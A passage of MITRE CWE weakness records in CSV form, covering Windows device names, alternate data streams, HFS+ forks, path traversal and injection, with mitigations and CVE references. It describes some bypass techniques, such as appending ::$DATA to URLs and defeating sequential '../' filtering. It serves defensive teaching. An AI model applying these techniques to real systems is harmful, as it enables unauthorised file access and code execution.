Device Names\",Variant,Incomplete,\"The product constructs pathnames from user input, but it does not handle or incorrectly handles a pathname containing a Windows device name such as AUX or CON. This typically leads to denial of service or an information exposure when the application attempts to process the pathname as a regular file.\",\"Not properly handling virtual filenames (e.g. AUX, CON, PRN, COM1, LPT1) can result in different types of vulnerabilities. In some cases an attacker can request a device via injection of a virtual filename in a URL, which may cause an error that leads to a denial of service or an error page that reveals sensitive information. A product that allows device names to bypass filtering runs the risk of an attacker injecting malicious code in a file with the name of a device.\",::NATURE:ChildOf:CWE ID:66:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Resultant::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Windows:OPERATING SYSTEM PREVALENCE:Undetermined::,\"::Historically, there was a bug in the Windows operating system that caused a blue screen of death. Even after that issue was fixed DOS device names continue to be a factor.::\",\"\",\"::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Availability:SCOPE:Confidentiality:SCOPE:Other:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:Read Application Data:IMPACT:Other::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Be familiar with the device names in the operating system where your system is deployed. Check input for these device names.::\",\"::REFERENCE:CVE-2002-0106:DESCRIPTION:Server allows remote attackers to cause a denial of service via a series of requests to .JSP files that contain an MS-DOS device name.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0106::REFERENCE:CVE-2002-0200:DESCRIPTION:Server allows remote attackers to cause a denial of service via an HTTP request for an MS-DOS device name.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0200::REFERENCE:CVE-2002-1052:DESCRIPTION:Product allows remote attackers to use MS-DOS device names in HTTP requests to cause a denial of service or obtain the physical path of the server.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1052::REFERENCE:CVE-2001-0493:DESCRIPTION:Server allows remote attackers to cause a denial of service via a URL that contains an MS-DOS device name.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0493::REFERENCE:CVE-2001-0558:DESCRIPTION:Server allows a remote attacker to create a denial of service via a URL request which includes a MS-DOS device name.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0558::REFERENCE:CVE-2000-0168:DESCRIPTION:Microsoft Windows 9x operating systems allow an attacker to cause a denial of service via a pathname that includes file device names, aka the DOS Device in Path Name vulnerability.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0168::REFERENCE:CVE-2001-0492:DESCRIPTION:Server allows remote attackers to determine the physical path of the server via a URL containing MS-DOS device names.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0492::REFERENCE:CVE-2004-0552:DESCRIPTION:Product does not properly handle files whose names contain reserved MS-DOS device names, which can allow malicious code to bypass detection when it is installed, copied, or executed.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0552::REFERENCE:CVE-2005-2195:DESCRIPTION:Server allows remote attackers to cause a denial of service (application crash) via a URL with a filename containing a .cgi extension and an MS-DOS device name.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2195::\",,::File or Directory::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Windows MS-DOS device names::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO32-C:ENTRY NAME:Do not perform operations on devices that are only appropriate for files:MAPPING FIT:CWE More Specific::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:FIO00-J:ENTRY NAME:Do not operate on files in shared directories::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n69,\"Improper Handling of Windows ::DATA Alternate Data Stream\",Variant,Incomplete,\"The product does not properly prevent access to, or detect usage of, alternate data streams (ADS).\",\"An attacker can use an ADS to hide information about a file (e.g. size, the name of the process) from a system or file browser tools such as Windows Explorer and 'dir' at the command line utility. Alternately, the attacker might be able to bypass intended access restrictions for the associated data fork.\",::NATURE:ChildOf:CWE ID:66:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Windows:OPERATING SYSTEM PREVALENCE:Undetermined::,\"::Alternate data streams (ADS) were first implemented in the Windows NT operating system to provide compatibility between NTFS and the Macintosh Hierarchical File System (HFS). In HFS, data and resource forks are used to store information about a file. The data fork provides information about the contents of the file while the resource fork stores metadata such as file type.::\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:SCOPE:Non-Repudiation:SCOPE:Other:IMPACT:Bypass Protection Mechanism:IMPACT:Hide Activities:IMPACT:Other::\",\"\",\"::PHASE:Testing:DESCRIPTION:Software tools are capable of finding ADSs on your system.::PHASE:Implementation:DESCRIPTION:Ensure that the source code correctly parses the filename to read or write to the correct stream.::\",\"::REFERENCE:CVE-1999-0278:DESCRIPTION:In IIS, remote attackers can obtain source code for ASP files by appending ::$DATA to the URL.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0278::REFERENCE:CVE-2000-0927:DESCRIPTION:Product does not properly record file sizes if they are stored in alternative data streams, which allows users to bypass quota restrictions.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0927::\",,::System Process::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Windows ::DATA alternate data stream::\",::168::,\"::TYPE:Theoretical:NOTE:This and similar problems exist because the same resource can have multiple identifiers that dictate which behavior can be performed on the resource.::\",\n72,\"Improper Handling of Apple HFS+ Alternate Data Stream Path\",Variant,Incomplete,\"The product does not properly handle special paths that may identify the data or resource fork of a file on the HFS+ file system.\",\"If the product chooses actions to take based on the file name, then if an attacker provides the data or resource fork, the product may take unexpected actions. Further, if the product intends to restrict access to a file, then an attacker might still be able to bypass intended access restrictions by requesting the data or resource fork for that file.\",::NATURE:ChildOf:CWE ID:66:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:macOS:OPERATING SYSTEM PREVALENCE:Undetermined::,\"::The Apple HFS+ file system permits files to have multiple data input streams, accessible through special paths. The Mac OS X operating system provides a way to access the different data input streams through special paths and as an extended attribute: - Resource fork: file/..namedfork/rsrc, file/rsrc (deprecated), xattr:com.apple.ResourceFork - Data fork: file/..namedfork/data (only versions prior to Mac OS X v10.5) Additionally, on filesystems that lack native support for multiple streams, the resource fork and file metadata may be stored in a file with ._ prepended to the name. Forks can also be accessed through non-portable APIs. Forks inherit the file system access controls of the file they belong to. Programs need to control access to these paths, if the processing of a file system object is dependent on the structure of its path.::\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"\",\"::REFERENCE:CVE-2004-1084:DESCRIPTION:Server allows remote attackers to read files and resource fork content via HTTP requests to certain special file names related to multiple data streams in HFS+.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1084::\",,,\"\",,\"::TYPE:Theoretical:NOTE:This and similar problems exist because the same resource can have multiple identifiers that dictate which behavior can be performed on the resource.::TYPE:Research Gap:NOTE:Under-studied::\","
  },
  "doc-5aedcedc4deedc62a0d5f89f14ed6ad4": {
    "content": "CWE-ID,Name,Weakness Abstraction,Status,Description,Extended Description,Related Weaknesses,Weakness Ordinalities,Applicable Platforms,Background Details,Alternate Terms,Modes Of Introduction,Exploitation Factors,Likelihood of Exploit,Common Consequences,Detection Methods,Potential Mitigations,Observed Examples,Functional Areas,Affected Resources,Taxonomy Mappings,Related Attack Patterns,Notes\n73,\"External Control of File Name or Path\",Base,Draft,\"The product allows user input to control or influence paths or file names that are used in filesystem operations.\",\"This could allow an attacker to access or modify system files or other files that are critical to the application. Path manipulation errors occur when the following two conditions are met: 1. An attacker can specify a path used in an operation on the filesystem. 2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted. For example, the program may give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.\",::NATURE:ChildOf:CWE ID:642:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:610:VIEW ID:1000::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:22:VIEW ID:1000::NATURE:CanPrecede:CWE ID:41:VIEW ID:1000::NATURE:CanPrecede:CWE ID:98:VIEW ID:1000::NATURE:CanPrecede:CWE ID:434:VIEW ID:1000::NATURE:CanPrecede:CWE ID:59:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Unix:OPERATING SYSTEM PREVALENCE:Often::OPERATING SYSTEM CLASS:Windows:OPERATING SYSTEM PREVALENCE:Often::OPERATING SYSTEM CLASS:macOS:OPERATING SYSTEM PREVALENCE:Often::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories:NOTE:The application can operate on unexpected files. Confidentiality is violated when the targeted filename is not directly readable by the attacker.::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Modify Files or Directories:IMPACT:Execute Unauthorized Code or Commands:NOTE:The application can operate on unexpected files. This may violate integrity if the filename is written to, or if the filename is for a program or other form of executable code.::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:DoS: Resource Consumption (Other):NOTE:The application can operate on unexpected files. Availability can be violated if the attacker specifies an unexpected file that the application modifies. Availability can also be affected if the attacker specifies a filename for a large file, or points to a special device or a file that does not have the format that the application expects.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:The external control or influence of filenames can often be detected using automated static analysis that models data flow within the product. Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes.::\",\"::PHASE:Architecture and Design:DESCRIPTION:When the set of filenames is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames, and reject all other inputs. For example, ID 1 could map to inbox.txt and ID 2 could map to profile.txt. Features such as the ESAPI AccessReferenceMap provide this capability.::PHASE:Architecture and Design Operation:DESCRIPTION:Run your code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict all access to files within a particular directory. Examples include the Unix chroot jail and AppArmor. In general, managed code may provide some protection. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.:EFFECTIVENESS:High::PHASE:Implementation:DESCRIPTION:Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes .. sequences and symbolic links (CWE-23, CWE-59).::PHASE:Installation Operation:DESCRIPTION:Use OS-level permissions and run as a low-privileged user to limit the scope of any successful attack.::PHASE:Operation Implementation:DESCRIPTION:If you are using PHP, configure your application so that it does not use register_globals. During implementation, develop your application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.::PHASE:Testing:DESCRIPTION:Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.::\",\"::REFERENCE:CVE-2022-45918:DESCRIPTION:Chain: a learning management tool debugger uses external input to locate previous session logs (CWE-73) and does not properly validate the given path (CWE-20), allowing for filesystem path traversal using ../ sequences (CWE-24):LINK:https://www.cve.org/CVERecord?id=CVE-2022-45918::REFERENCE:CVE-2008-5748:DESCRIPTION:Chain: external control of values for user's desired language and theme enables path traversal.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5748::REFERENCE:CVE-2008-5764:DESCRIPTION:Chain: external control of user's target language enables remote file inclusion.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5764::\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Path Manipulation::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",::13::267::64::72::76::78::79::80::,\"::TYPE:Maintenance:NOTE:CWE-114 is a Class, but it is listed a child of CWE-73 in view 1000. This suggests some abstraction problems that should be resolved in future versions.::TYPE:Relationship:NOTE:The external control of filenames can be the primary link in chains with other file-related weaknesses, as seen in the CanPrecede relationships. This is because software systems use files for many different purposes: to execute programs, load code libraries, to store application data, to store configuration settings, record temporary data, act as signals or semaphores to other processes, etc. However, those weaknesses do not always require external control. For example, link-following weaknesses (CWE-59) often involve pathnames that are not controllable by the attacker at all. The external control can be resultant from other issues. For example, in PHP applications, the register_globals setting can allow an attacker to modify variables that the programmer thought were immutable, enabling file inclusion (CWE-98) and path traversal (CWE-22). Operating with excessive privileges (CWE-250) might allow an attacker to specify an input filename that is not directly readable by the attacker, but is accessible to the privileged program. A buffer overflow (CWE-119) might give an attacker control over nearby memory locations that are related to pathnames, but were not directly modifiable by the attacker.::\",\n40,\"Path Traversal: 'UNCsharename' (Windows UNC Share)\",Variant,Draft,\"The product accepts input that identifies a Windows UNC share ('UNCsharename') that potentially redirects access to an unintended location or arbitrary file.\",\"\",::NATURE:ChildOf:CWE ID:36:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.:EFFECTIVENESS:High::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2001-0687:DESCRIPTION:FTP server allows a remote attacker to retrieve privileged web server system information by specifying arbitrary paths in the UNC format (computernamesharename).:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0687::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:'UNCsharename' (Windows UNC share)::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n74,\"Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\",Class,Incomplete,\"The product constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component.\",\"Software or other automated logic has certain assumptions about what constitutes data and control respectively. It is the lack of verification of these assumptions for user-controlled input that leads to injection problems. Injection problems encompass a wide variety of issues -- all mitigated in very different ways and usually attempted in order to alter the control flow of the process. For this reason, the most effective way to discuss these weaknesses is to note the distinct features that classify them as injection weaknesses. The most important issue to note is that all injection problems share one thing in common -- i.e., they allow for the injection of control plane data into the user-controlled data plane. This means that the execution of the process may be altered by sending code in through legitimate data channels, using no other mechanism. While buffer overflows, and many other flaws, involve the use of some further issue to gain execution, injection problems need only for the data to be parsed.\",::NATURE:ChildOf:CWE ID:707:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:NOTE:Many injection attacks involve the disclosure of important information -- in terms of both data sensitivity and usefulness in further exploitation.::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:NOTE:In some cases, injectable code controls authentication; this may lead to a remote vulnerability.::SCOPE:Other:IMPACT:Alter Execution Logic:NOTE:Injection attacks are characterized by the ability to significantly change the flow of a given process, and in some cases, to the execution of arbitrary code.::SCOPE:Integrity:SCOPE:Other:IMPACT:Other:NOTE:Data injection attacks lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing.::SCOPE:Non-Repudiation:IMPACT:Hide Activities:NOTE:Often the actions performed by injected control code are unlogged.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Requirements:DESCRIPTION:Programming languages and supporting technologies might be chosen which are not subject to these issues.::PHASE:Implementation:DESCRIPTION:Utilize an appropriate mix of allowlist and denylist parsing to filter control-plane syntax from all input.::\",\"::REFERENCE:CVE-2022-36069:DESCRIPTION:Python-based dependency management tool avoids OS command injection when generating Git commands but allows injection of optional arguments with input beginning with a dash (CWE-88), potentially allowing for code execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-36069::REFERENCE:CVE-1999-0067:DESCRIPTION:Canonical example of OS command injection. CGI program does not neutralize | metacharacter when invoking a phonebook program.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0067::REFERENCE:CVE-2022-1509:DESCRIPTION:injection of sed script syntax (sed injection):LINK:https://www.cve.org/CVERecord?id=CVE-2022-1509::REFERENCE:CVE-2020-9054:DESCRIPTION:Chain: improper input validation (CWE-20) in username parameter, leading to OS command injection (CWE-78), as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-9054::REFERENCE:CVE-2021-44228:DESCRIPTION:Product does not neutralize ${xyz} style expressions, allowing remote code execution. (log4shell vulnerability):LINK:https://www.cve.org/CVERecord?id=CVE-2021-44228::\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Injection problem ('data' used as something else)::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A6:ENTRY NAME:Injection Flaws:MAPPING FIT:CWE More Specific::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",::10::101::105::108::120::13::135::14::24::250::267::273::28::3::34::42::43::45::46::47::51::52::53::6::64::67::7::71::72::76::78::79::8::80::83::84::9::,\"::TYPE:Theoretical:NOTE:Many people treat injection only as an input validation problem (CWE-20) because many people do not distinguish between the consequence/attack (injection) and the protection mechanism that prevents the attack from succeeding. However, input validation is only one potential protection mechanism (output encoding is another), and there is a chaining relationship between improper input validation and the improper enforcement of the structure of messages to other components. Other issues not directly related to input validation, such as race conditions, could similarly impact message structure.::\",\n75,\"Failure to Sanitize Special Elements into a Different Plane (Special Element Injection)\",Class,Draft,\"The product does not adequately filter user-controlled input for special elements with control implications.\",\"\",::NATURE:ChildOf:CWE ID:74:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Modify Application Data:IMPACT:Execute Unauthorized Code or Commands::\",\"\",\"::PHASE:Requirements:DESCRIPTION:Programming languages and supporting technologies might be chosen which are not subject to these issues.::PHASE:Implementation:DESCRIPTION:Utilize an appropriate mix of allowlist and denylist parsing to filter special element syntax from all input.::\",\"\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Special Element Injection::\",::81::93::,\"\",\n76,\"Improper Neutralization of Equivalent Special Elements\",Base,Draft,\"The product correctly neutralizes certain special elements, but it improperly neutralizes equivalent special elements.\",\"The product may have a fixed list of special characters it believes is complete. However, there may be alternate encodings, or representations that also have the same meaning. For example, the product may filter out a leading slash (/) to prevent absolute path names, but does not account for a tilde (~) followed by a user name, which on some *nix systems could be expanded to an absolute pathname. Alternately, the product might filter a dangerous -e command-line switch when calling an external program, but it might not account for --exec or other switches that have the same semantics.\",::NATURE:ChildOf:CWE ID:75:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Other:IMPACT:Other::\",\"\",\"::PHASE:Requirements:DESCRIPTION:Programming languages and supporting technologies might be chosen which are not subject to these issues.::PHASE:Implementation:DESCRIPTION:Utilize an appropriate mix of allowlist and denylist parsing to filter equivalent special element syntax from all input.::\",\"\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Equivalent Special Element Injection::\",,\"\",\n77,\"Improper Neutralization of Special Elements used in a Command ('Command Injection')\",Class,Draft,\"The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component.\",\"Many protocols and products have their own custom command language. While OS or shell command strings are frequently discovered and targeted, developers may not realize that these other command languages might also be vulnerable to attacks.\",::NATURE:ChildOf:CWE ID:74:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:74:VIEW ID:1003:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY NAME:AI/ML:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"::TERM:Command injection:DESCRIPTION:an attack-oriented phrase for this weakness. Note: often used when OS command injection (CWE-78) was intended.::\",\"::PHASE:Implementation:NOTE:Command injection vulnerabilities typically occur when: Data enters the application from an untrusted source. The data is part of a string that is executed as a command by the application.::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:NOTE:If a malicious user injects a character (such as a semi-colon) that delimits the end of one command and the beginning of another, it may be possible to then insert an entirely new and unrelated command that was not intended to be executed. This gives an attacker a privilege or capability that they would not otherwise have.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:If at all possible, use library calls rather than external processes to recreate the desired functionality.::PHASE:Implementation:DESCRIPTION:If possible, ensure that all external commands called from the program are statically created.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Operation:DESCRIPTION:Run time: Run time policy enforcement may be used in an allowlist fashion to prevent use of any non-sanctioned commands.::PHASE:System Configuration:DESCRIPTION:Assign permissions that prevent the user from accessing/opening privileged files.::\",\"::REFERENCE:CVE-2022-1509:DESCRIPTION:injection of sed script syntax (sed injection):LINK:https://www.cve.org/CVERecord?id=CVE-2022-1509::REFERENCE:CVE-2024-5184:DESCRIPTION:API service using a large generative AI model allows direct prompt injection to leak hard-coded system prompts or execute other prompts.:LINK:https://www.cve.org/CVERecord?id=CVE-2024-5184::REFERENCE:CVE-2020-11698:DESCRIPTION:anti-spam product allows injection of SNMP commands into confiuration file:LINK:https://www.cve.org/CVERecord?id=CVE-2020-11698::REFERENCE:CVE-2019-12921:DESCRIPTION:image program allows injection of commands in Magick Vector Graphics (MVG) language.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-12921::REFERENCE:CVE-2022-36069:DESCRIPTION:Python-based dependency management tool avoids OS command injection when generating Git commands but allows injection of optional arguments with input beginning with a dash (CWE-88), potentially allowing for code execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-36069::REFERENCE:CVE-1999-0067:DESCRIPTION:Canonical example of OS command injection. CGI program does not neutralize | metacharacter when invoking a phonebook program.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0067::REFERENCE:CVE-2020-9054:DESCRIPTION:Chain: improper input validation (CWE-20) in username parameter, leading to OS command injection (CWE-78), as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-9054::REFERENCE:CVE-2021-41282:DESCRIPTION:injection of sed script syntax (sed injection):LINK:https://www.cve.org/CVERecord?id=CVE-2021-41282::REFERENCE:CVE-2019-13398:DESCRIPTION:injection of sed script syntax (sed injection):LINK:https://www.cve.org/CVERecord?id=CVE-2019-13398::\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Command Injection::TAXONOMY NAME:CLASP:ENTRY NAME:Command injection::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A2:ENTRY NAME:Injection Flaws:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A1:ENTRY NAME:Unvalidated Input:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A6:ENTRY NAME:Injection Flaws:MAPPING FIT:CWE More Specific::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::TAXONOMY NAME:SEI CERT Perl Coding Standard:ENTRY ID:IDS34-PL:ENTRY NAME:Do not pass untrusted, unsanitized data to a command interpreter:MAPPING FIT:CWE More Specific::\",::136::15::183::248::40::43::75::76::,\"::TYPE:Terminology:NOTE:The command injection phrase carries different meanings, either as an attack or as a technical impact. The most common usage of command injection refers to the more-accurate OS command injection (CWE-78), but there are many command languages. In vulnerability-focused analysis, the phrase may refer to any situation in which the adversary can execute commands of their own choosing, i.e., the focus is on the risk and/or technical impact of exploitation. Many proof-of-concept exploits focus on the ability to execute commands and may emphasize command injection. However, there are dozens of weaknesses that can allow execution of commands. That is, the ability to execute commands could be resultant from another weakness. To some, command injection can include cases in which the functionality intentionally allows the user to specify an entire command, which is then executed. In this case, the root cause weakness might be related to missing or incorrect authorization, since an adversary should not be able to specify arbitrary commands, but some users or admins are allowed. CWE-77 and its descendants are specifically focused on behaviors in which the product is intentionally building a command to execute, and the adversary can inject separators into the command or otherwise change the command being executed.::TYPE:Other:NOTE:Command injection is a common problem with wrapper programs.::\",\n78,\"Improper Neutralization 